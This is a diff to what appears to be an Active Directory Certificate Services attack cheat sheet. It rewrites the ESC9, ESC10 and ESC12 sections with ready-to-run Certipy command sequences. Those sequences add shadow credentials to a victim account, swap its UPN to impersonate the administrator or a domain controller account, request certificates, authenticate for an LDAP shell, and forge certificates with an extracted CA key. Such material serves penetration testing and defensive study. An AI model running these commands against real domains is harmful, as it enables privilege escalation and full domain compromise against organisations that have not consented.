@@ -302,52 +302,79 @@ KrbRelay.exe -spn http/$CA_HOST -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 `
 ## ESC9: No Security Extension
 
 **Conditions:**
-- Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag
-- You have GenericWrite on an account
+- Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag (`NoSecurityExtension` in Certipy output)
+- `StrongCertificateBindingEnforcement` = 0 (Disabled) or 1 (Compatibility) on DCs — **not 2 (Full Enforcement)**
+- You have GenericWrite on a victim account that can enrol on the template
 
-Without the security extension the cert isn't bound to a specific account SID, so temporarily changing a victim's UPN to match the admin gets you a valid admin cert.
+Without the SID security extension the cert isn't bound to a specific account SID. The DC falls back to UPN-based mapping, so temporarily swapping a victim's UPN to match the admin gets you a valid admin cert via Kerberos PKINIT.
 
 ```bash wrap
-# Change UPN of account to admin
+# Step 1: Get victim credentials if you only have GenericWrite (shadow creds)
+certipy shadow auto -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -account $TARGET
+# → writes $TARGET.ccache and NT hash
+
+# Step 2: Swap victim UPN to target's sAMAccountName
 certipy account update -u $USER@$DOMAIN -p $PASSWORD \
-  -user $TARGET -upn administrator
+  -dc-ip $DC_IP -user $TARGET -upn administrator
 
-# Request cert as target
-certipy req -u $TARGET@$DOMAIN -p $PASSWORD \
-  -dc-ip $DC_IP \
-  -target $CA_HOST \
-  -ca $CA \
-  -template $TEMPLATE
+# Step 3: Request cert as victim (cert gets UPN 'administrator', no SID extension)
+export KRB5CCNAME=$TARGET.ccache
+certipy req -k -dc-ip $DC_IP \
+  -target $CA_HOST -ca $CA -template $TEMPLATE
 
-# Restore UPN
+# Step 4: Restore UPN
 certipy account update -u $USER@$DOMAIN -p $PASSWORD \
-  -user $TARGET -upn $TARGET@$DOMAIN
+  -dc-ip $DC_IP -user $TARGET -upn $TARGET@$DOMAIN
 
-# Authenticate
-certipy auth -pfx administrator.pfx -dc-ip $DC_IP -domain $DOMAIN
+# Step 5: Authenticate as administrator (PKINIT)
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP \
+  -username administrator -domain $DOMAIN
 ```
 
-## ESC10: Weak Certificate Mappings
+<Tip>
+If the CA is also vulnerable to ESC6 (`EDITF_ATTRIBUTESUBJECTALTNAME2`), add `-upn administrator@$DOMAIN -sid S-1-5-21-...-500` to the `req` step and skip the UPN swap entirely — this works even in Full Enforcement mode.
+</Tip>
+
+## ESC10: Weak Certificate Mapping for Schannel Authentication
 
 **Conditions:**
-- Registry key `StrongCertificateBindingEnforcement` = 0 or 1 (not 2)
-- OR `CertificateMappingMethods` has UPN bit set
+- `CertificateMappingMethods` on the target DC includes the `0x4` bit (UPN mapping for Schannel)
+- You have GenericWrite on a victim account that can enrol for a client auth cert
+- The template does **not** need to be ESC9 — the victim's cert SID is already present; Schannel's UPN mapping ignores it when `0x4` is set
 
-Similar to ESC9: weak mapping means the DC resolves cert to account by UPN rather than by SID, so a UPN swap is all you need.
+ESC10 abuses Schannel (LDAPS/TLS), not Kerberos PKINIT. The `CertificateMappingMethods` registry key (`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\`) on the DC governs how TLS client certificates are mapped to accounts. With the `0x4` bit set, the DC maps by UPN — so a cert whose SAN UPN is `dc$@corp.local` authenticates as the DC machine account even if the cert's embedded SID belongs to the victim.
+
+The typical target is a DC's machine account (`DC$`) because machine accounts don't have a UPN by default, so their `sAMAccountName` (`DC01$`) is free to collide.
 
 ```bash wrap
-# Change UPN then request cert
+# Step 1: Get victim credentials if needed (shadow creds)
+certipy shadow auto -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -account $TARGET
+# → writes $TARGET.ccache
+
+# Step 2: Swap victim UPN to DC machine account's sAMAccountName
 certipy account update -u $USER@$DOMAIN -p $PASSWORD \
-  -user $TARGET -upn administrator@$DOMAIN
+  -dc-ip $DC_IP -user $TARGET -upn $DC_SAM@$DOMAIN
+# e.g. -upn dc01$@corp.local
 
-certipy req -u $TARGET@$DOMAIN -p $PASSWORD \
-  -dc-ip $DC_IP \
-  -target $CA_HOST \
-  -ca $CA \
-  -template User
+# Step 3: Request cert as victim (cert SAN UPN = dc01$@corp.local, SID = victim's)
+export KRB5CCNAME=$TARGET.ccache
+certipy req -k -dc-ip $DC_IP \
+  -target $CA_HOST -ca $CA -template User
 
-certipy auth -pfx administrator.pfx -dc-ip $DC_IP -ldap-shell
+# Step 4: Restore victim UPN
+certipy account update -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP -user $TARGET -upn $TARGET@$DOMAIN
+
+# Step 5: Authenticate to LDAPS as the DC account (Schannel, not PKINIT)
+certipy auth -pfx $DC_SAM.pfx -dc-ip $DC_IP -ldap-shell
+# DC$ LDAP shell → RBCD, DCSync via LDAP, read sensitive attributes
 ```
+
+<Note>
+ESC10 authenticates via **Schannel** (LDAPS port 636). `StrongCertificateBindingEnforcement` (Kerberos PKINIT enforcement) is irrelevant here — Schannel maps independently via `CertificateMappingMethods`. A DC with PKINIT in Full Enforcement but `CertificateMappingMethods` including `0x4` is still vulnerable to ESC10.
+</Note>
 
 ## ESC11: IF_ENFORCEENCRYPTICERTREQUEST
 
@@ -365,27 +392,27 @@ ntlmrelayx.py -t rpc://$CA_HOST -rpc-mode ICPR \
 certipy auth -pfx dc.pfx -dc-ip $DC_IP
 ```
 
-## ESC12: CA Key Compromise (Golden Certificate)
+## ESC12: YubiHSM2 Vulnerability
 
 **Conditions:**
-- Admin or SYSTEM access on the CA server
+- CA uses a YubiHSM2 for its private signing keys
+- Attacker has low-privileged shell access on the CA server
+- A flaw in the YubiHSM2 KSP/driver allows a low-priv process to trigger signing operations
 
-With the CA private key you can forge valid certificates for any principal in the domain. Forged certs bypass template restrictions and enrolment logs entirely.
+ESC12 targets a specific weakness in the YubiHSM2 Key Storage Provider: a local non-admin process can (under certain conditions) coerce the HSM to sign attacker-supplied CSRs, without needing to extract the key material. Certipy itself does not exploit the HSM flaw — that part requires custom tooling. If the CA key is extracted or arbitrary signing is achieved, then certipy takes over for forging.
 
 ```bash wrap
-# Back up the CA private key and certificate (requires admin on CA server)
-certipy ca -u $USER@$DOMAIN -p $PASSWORD \
-  -target $CA_HOST -ca $CA \
-  -backup
-
-# Forge a certificate for any user
+# If CA key is extracted and available as a PFX (e.g. after HSM exploit):
 certipy forge -ca-pfx $CA.pfx \
   -upn administrator@$DOMAIN \
   -sid S-1-5-21-...-500
 
-# Authenticate with the forged cert
 certipy auth -pfx administrator_forged.pfx -dc-ip $DC_IP
 ```
+
+<Note>
+General CA compromise (admin/SYSTEM on the CA server via any path) combined with `certipy ca -backup` and `certipy forge` is documented under ESC5 post-exploitation. ESC12 specifically refers to the YubiHSM2 local-privilege flaw researched by Hans-Joachim Knobloch.
+</Note>
 
 ## ESC13: OID Group Link
 
